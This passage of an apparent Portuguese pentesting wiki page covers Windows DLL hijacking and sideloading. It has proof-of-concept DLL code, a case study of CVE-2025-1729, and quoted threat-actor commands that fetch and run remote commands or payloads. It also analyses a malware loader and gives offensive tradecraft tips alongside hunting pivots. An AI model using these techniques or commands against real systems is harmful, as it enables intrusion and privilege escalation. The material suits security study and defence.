- Com o procedimento acima, iniciar o Narrator carrega a DLL implantada. Na secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL será executada como SYSTEM na secure desktop.

Execução SYSTEM acionada por RDP (movimentação lateral)
- Permitir a camada de segurança clássica do RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte-se via RDP ao host e, na tela de logon, pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL será executada como SYSTEM na secure desktop.
- A execução é interrompida quando a sessão RDP é encerrada — injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de uma Accessibility Tool (AT) integrada (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e, em seguida, definir `configuration` com o nome dessa AT. Isso intermedeia a execução arbitrária sob o framework de Accessibility.

Observações
- Escrever em `%windir%\System32` e alterar valores do HKLM exige direitos de administrador.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; não são necessárias exports.

## Estudo de caso: CVE-2025-1729 - Escalação de privilégios usando TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalhes da vulnerabilidade

- **Componente**: `TPQMAssistant.exe`, localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` é executada diariamente às 9h30 no contexto do usuário conectado.
- **Permissões do diretório**: Gravável por `CREATOR OWNER`, permitindo que usuários locais depositem arquivos arbitrários.
- **Comportamento de busca de DLL**: Tenta carregar `hostfxr.dll` primeiro a partir do diretório de trabalho e registra "NAME NOT FOUND" quando ausente, indicando precedência da busca no diretório local.

### Implementação do exploit

Um atacante pode colocar um stub malicioso de `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código no contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo do ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a execução da scheduled task às 9:30, no contexto do usuário atual.
3. Se um administrador estiver conectado quando a task for executada, a DLL maliciosa será executada na sessão do administrador com integridade média.
4. Encadeie técnicas padrão de bypass de UAC para elevar de integridade média para privilégios de SYSTEM.

## Estudo de caso: MSI CustomAction Dropper + DLL Side-Loading via Host assinado (wsc_proxy.exe)

Atores de ameaça frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads em um processo confiável e assinado.<sup>[[10]](#references)</sup>

Visão geral da cadeia
- O usuário baixa um MSI. Uma CustomAction é executada silenciosamente durante a instalação via GUI (por exemplo, uma ação LaunchApplication ou VBScript), reconstruindo o próximo estágio a partir de recursos incorporados.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: wsc_proxy.exe assinado pela Avast + wsc.dll controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de pesquisa de DLL do Windows carrega primeiro `wsc.dll` do diretório de trabalho, executando o código do atacante sob um processo pai assinado (ATT&CK T1574.001).

Análise de MSI (o que procurar)
- Tabela CustomAction:
- Procure entradas que executem executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo incorporado em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione CustomAction, InstallExecuteSequence e Binary tables.
- Payloads incorporados/divididos no CAB do MSI:
- Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou use lessmsi: lessmsi x package.msi C:\out
- Procure vários fragmentos pequenos que sejam concatenados e descriptografados por uma CustomAction de VBScript. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do próprio diretório.
- wsc.dll: DLL do atacante. Se não forem necessários exports específicos, DllMain pode ser suficiente; caso contrário, crie uma proxy DLL e encaminhe os exports necessários para a biblioteca legítima enquanto executa o payload em DllMain.
- Crie um payload mínimo em uma DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxying (por exemplo, DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Essa técnica depende da resolução do nome da DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack poderá falhar.
- KnownDLLs, SxS e exports encaminhados podem influenciar a precedência e devem ser considerados durante a seleção do binário host e do conjunto de exports.

## Tríades assinadas + payloads criptografados (estudo de caso ShadowPad)

A Check Point descreveu como o Ink Dragon implanta o ShadowPad usando uma **tríade de três arquivos** para se misturar a software legítimo enquanto mantém o payload principal criptografado no disco:<sup>[[12]](#references)</sup>

1. **EXE host assinado** – fornecedores como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para fazê-lo parecer um binário do Windows (por exemplo, `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **Malicious loader DLL** – colocada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, descriptografá-lo e fazer o mapeamento reflexivo do ShadowPad.
3. **Blob de payload criptografado** – geralmente armazenado como `<name>.tmp` no mesmo diretório. Após fazer o memory-mapping do payload descriptografado, o loader exclui o arquivo TMP para destruir evidências forenses.

Notas de tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário do Windows e, ao mesmo tempo, mantenha a assinatura do fornecedor; portanto, replique o hábito do Ink Dragon de colocar binários com aparência de `conhost.exe` que, na realidade, são utilitários da AMD/NVIDIA.
* Como o executável permanece confiável, a maioria dos controles de allowlisting precisa apenas que sua DLL maliciosa esteja ao lado dele. Concentre-se em personalizar a loader DLL; normalmente, o parent assinado pode ser executado sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e possa ser gravado, para que possa zerar o arquivo após o mapeamento. Mantenha o diretório gravável até o carregamento do payload; depois que estiver na memória, o arquivo TMP poderá ser excluído com segurança para OPSEC.

### Stager LOLBAS + cadeia de sideloading de arquivo compactado em etapas (finger → tar/curl → WMI)

Operators combinam DLL sideloading com LOLBAS para que o único artefato customizado no disco seja a DLL maliciosa ao lado do EXE confiável:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** O PowerShell oculto inicia `cmd.exe /c`, obtém comandos de um servidor Finger e os envia por pipe para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtém texto via TCP/79; `| cmd` executa a resposta do servidor, permitindo que os operators alternem o servidor do segundo estágio no lado do servidor.

- **Download/extração integrados:** Baixe um arquivo compactado com uma extensão benigna, extraia-o e prepare o alvo do sideloading e a DLL em uma pasta `%LocalAppData%` aleatória:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirecionamentos; `tar -xf` usa o tar integrado do Windows.

- **Inicialização via WMI/CIM:** Inicie o EXE via WMI para que a telemetria mostre um processo criado por CIM enquanto ele carrega a DLL colocada ao lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binários que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) é executado sob o nome confiável.

- **Hunting:** Gere um alerta para `forfiles` quando `/p`, `/m` e `/c` aparecerem juntos; essa combinação é incomum fora de scripts administrativos.


## Estudo de caso: dropper NSIS + sideload do Bitdefender Submission Wizard (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia de atualização confiável para entregar um dropper empacotado com NSIS que preparava um DLL sideloading junto com payloads totalmente executados na memória.<sup>[[13]](#references)</sup>

Fluxo de tradecraft
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca-o como **HIDDEN**, coloca um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, uma `log.dll` maliciosa e um blob criptografado `BluetoothService`, e então inicia o EXE.
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` carrega o blob via mmap; `LogWrite` o descriptografa com um stream baseado em LCG customizado (constantes **0x19660D** / **0x3C6EF35F**, material da chave derivado de um hash anterior), sobrescreve o buffer com shellcode em texto claro, libera temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hash dos nomes dos exports usando **FNV-1a basis 0x811C9DC5 + prime 0x100019**, aplicando depois um avalanche no estilo Murmur (**0x85EBCA6B**) e comparando com hashes-alvo salgados.

Shellcode principal (Chrysalis)
- Descriptografa um módulo principal semelhante a PE repetindo add/XOR/sub com a chave `gQ2JR&9;` em cinco passagens e, em seguida, carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para concluir a resolução dos imports.
- Reconstrói as strings dos nomes das DLLs em tempo de execução por meio de transformações de bit-rotate/XOR por caractere e, depois, carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada tabela de exports em blocos de 4 bytes com mixing no estilo Murmur e só recorre a `GetProcAddress` se o hash não for encontrado.

Configuração incorporada e C2
- A configuração fica dentro do arquivo `BluetoothService` colocado no disco, no **offset 0x30808** (tamanho **0x980**), e é descriptografada com RC4 usando a chave `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Os beacons constroem um perfil de host delimitado por pontos, acrescentam a tag `4Q` e, em seguida, criptografam com RC4 usando a chave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. As respostas são descriptografadas com RC4 e encaminhadas por um switch de tags (`4T` shell, `4V` execução de processo, `4W/4X` gravação de arquivo, `4Y` leitura/exfil, `4\\` desinstalação, `4` enumeração de unidades/arquivos + casos de transferência em partes).
- O modo de execução é controlado por argumentos CLI: sem argumentos = instala persistência (service/Run key) apontando para `-i`; `-i` reinicia a si mesmo com `-k`; `-k` ignora a instalação e executa o payload.

Loader alternativo observado
- A mesma intrusão colocou o Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` a partir de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código-fonte C fornecido pelo atacante incorporava shellcode, era compilado e executado na memória sem gravar um PE no disco. Replique com:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilação e execução baseada em TCC importava `Wininet.dll` em runtime e obtinha um shellcode de segundo estágio a partir de uma URL hardcoded, fornecendo um loader flexível que se disfarça de execução de compilador.

## Signed-host sideloading with export proxying + host thread parking

Algumas cadeias de DLL sideloading adicionam **engenharia de estabilidade** para manter o host legítimo ativo por tempo suficiente para carregar os estágios posteriores corretamente, em vez de travar após o carregamento da DLL maliciosa.<sup>[[11]](#references)</sup>

Padrão observado
- Coloque um EXE confiável ao lado de uma DLL maliciosa usando o nome de dependência esperado, como `version.dll`.
- A DLL maliciosa faz **proxy de todas as exportações esperadas** para a DLL de sistema real (por exemplo, `%SystemRoot%\\System32\\version.dll`), para que a resolução de imports continue funcionando e o processo host permaneça operacional.
- Após o carregamento, a DLL maliciosa **modifica o entry point do host** para que a thread principal entre em um loop infinito de `Sleep`, em vez de sair ou executar caminhos de código que encerrariam o processo.
- Uma nova thread executa o trabalho malicioso real: descriptografar o nome ou caminho da DLL do estágio seguinte (RC4/XOR são comuns) e então carregá-la com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLL preserva a compatibilidade da API, mas não garante que o host permaneça ativo por tempo suficiente para os estágios posteriores.
- Colocar a thread principal em `Sleep(INFINITE)` é uma forma simples de manter o processo assinado residente enquanto o loader executa a descriptografia, o staging ou o bootstrap de rede em uma worker thread.
- Procurar apenas por um `DllMain` suspeito pode não detectar esse padrão se o comportamento interessante ocorrer depois que o entry point do host for modificado e uma thread secundária for iniciada.

Workflow mínimo
1. Copie o EXE do host assinado e determine qual DLL ele resolve a partir do diretório local.
2. Compile uma DLL proxy exportando as mesmas funções e encaminhando-as para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, modifique o entry point do host ou a rotina de início da thread principal para que ela execute um loop em `Sleep`.
5. Descriptografe o nome/configuração da DLL do estágio seguinte e chame `LoadLibrary` ou faça o manual-map do payload.

Pivôs defensivos
- Processos assinados carregando `version.dll` ou bibliotecas comuns semelhantes a partir do próprio diretório da aplicação, em vez de `System32`.
- Patches de memória no entry point do processo logo após o carregamento da imagem, especialmente jumps/calls redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma DLL proxy que chamam imediatamente `LoadLibrary` em uma segunda DLL com um nome descriptografado.
- DLLs proxy com todas as exportações, colocadas ao lado de executáveis de fornecedores em diretórios de staging graváveis, como `ProgramData`, `%TEMP%` ou caminhos de arquivos descompactados.

## References

- [1] [Red Canary – Insights de Inteligência: janeiro de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalonamento de privilégios usando TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking no Windows. Exemplo simples em C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribui novo malware direcionado à Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Quando DLL Hijacks encontram os Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers digitais: anatomia de campanhas de personificação em evolução que distribuem o Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interesses convergentes: análise de clusters de ameaças direcionados a um governo do Sudeste Asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro do Ink Dragon: revelando a rede de relay e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – O backdoor Chrysalis: uma análise detalhada do toolkit do Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → cadeia de DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Rastreando as campanhas de espionagem de 2026 do APT iraniano Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rápido e furioso: operações do Nimbus Manticore durante o conflito iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ações de tarefas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 tem como alvos governos e infraestrutura crítica do Sudeste Asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
